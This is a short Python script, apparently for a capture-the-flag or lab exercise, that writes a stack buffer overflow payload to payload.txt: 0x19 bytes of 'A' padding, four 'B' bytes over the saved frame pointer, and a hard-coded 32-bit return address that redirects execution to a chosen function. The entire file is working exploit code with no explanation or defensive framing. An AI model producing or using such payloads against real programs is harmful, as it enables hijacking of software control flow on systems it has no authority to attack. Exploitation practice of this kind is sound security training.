#!/usr/bin/python3

TO_EBP      = 0x19
EBP_BYTES   = 0x04
FUNC_ADDR   = b"\x96\x91\x04\x08"

with open("payload.txt", "wb") as f:
    f.write(b"A" * TO_EBP + b"B" * EBP_BYTES + FUNC_ADDR)
